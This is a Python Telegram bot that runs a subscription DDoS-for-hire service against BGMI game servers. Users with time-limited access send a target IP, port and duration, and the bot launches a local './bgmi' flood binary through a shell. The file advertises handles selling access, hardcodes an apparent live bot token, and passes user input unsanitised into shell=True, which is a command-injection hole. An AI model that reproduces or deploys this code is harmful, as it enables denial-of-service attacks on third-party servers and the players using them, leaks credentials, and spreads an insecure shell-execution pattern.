#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import time

# insert your Telegram bot token here
bot = telebot.TeleBot('7328357250:AAGknEVyozRXv2gjYvYGkTSJQI82EKEbxr4')

# Admin user IDs
admin_id = ["1885535376"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store allowed user_access
USER_ACCESS_FILE = "users_access.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Define the duration of access (in seconds per day)
ACCESS_DURATION_PER_DAY = 24 * 60 * 60

# Define a dictionary to store user access data
user_access = {}

# Function to save user access data
def save_user_access(data):
    with open(USER_ACCESS_FILE, "w") as file:
        for user_id, access_info in data.items():
            file.write(f"{user_id}:{access_info['expiry_time']}\n")

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to handle expired access
def handle_expired_access(user_id):
    current_time = time.time()
    if user_id in user_access:
        expiry_time = user_access[user_id]["expiry_time"]
        if current_time > expiry_time:
            # Access expired, remove from allowed users
            if user_id in allowed_user_ids:
                allowed_user_ids.remove(user_id)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
            # Remove from user_access
            del user_access[user_id]
            # Save user access data
            save_user_access(user_access)
            return True
    return False

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:  # Check if the command contains the user ID and number of days
            user_to_add = command[1]
            days = int(command[2])  # Extract the number of days
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                # Calculate the expiry time
                expiry_time = time.time() + days * ACCESS_DURATION_PER_DAY
                # Update user access
                user_access[user_to_add] = {"expiry_time": expiry_time}
                # Save user access data
                save_user_access(user_access)
                response = f"User {user_to_add} approved for {days} days by @Ddos_Davil_8808.  🅑🅞🅣 🅛🅘🅝🅚 : @BGMI_DDOS_SERVER_HACKbot"
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID and the number of days to add."
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "Only admin can run this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "Only admin can run this command."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🔥 ATTACK STARTED SUCESSFULL🔥.\n\nTarget IP : {target}\nPort : {port}\nTime : {time} seconds\nGAME : BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 30  # Cooldown time in seconds (30 seconds)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You are on cooldown. Please wait 30 seconds before running the /bgmi command again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        # Check if user's access has expired
        if handle_expired_access(user_id):
            response = "Your access has expired. Please contact @Ddos_Davil_8808 to renew your access."
            bot.reply_to(message, response)
            return
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 280:
                response = "Error: Time interval must be less than 280 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 280"
                subprocess.run(full_command, shell=True)
                response = f"🔥BGMI attack finished 🔥. \n\nTarget IP : {target}\nPort : {port}\nTime : {time} seconds\nGAME : BGMI."
        else:
            response = "Usage: /bgmi <ip> <port> <time> TIME SUPPORTED UPTO 280 SECONDS " # Updated command syntax
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
- /bgmi : Method for BGMI servers.
- /rules : Please check before use.
- /mylogs : To check your recent attacks.
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''Welcome =, {user_name}! 
    DM :  @Ddos_Davil_8808 for acess.
    JOIN :  @BGMI_DDOS_SERVER_HACK
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def show_access_expiry(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in user_access:
            expiry_timestamp = user_access[user_id]["expiry_time"]
            expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
            response = f"Your access expires on: {expiry_date}"
        else:
            response = "Your access expiry information is not available."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, admin commands are here:

- /add <userId> : Add a user.
- /remove <userId> : Remove a user.
- /allusers : Authorized users list.
- /logs : All users' logs.
- /broadcast : Broadcast a message.
- /clearlogs : Clear the logs file.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, please follow these rules:

1. Attack start from commands /bgmi <ip> <port> <time> no need of threads.
2. Don't run 2 attacks at the same time, as it will result in a ban from the bot.
3. In game freeze also suported. 
4. click on /plan from menu to check expiry details.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = " Message to all users by Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
    else:
        response = "Only admin can run this command."

    bot.reply_to(message, response)

bot.polling()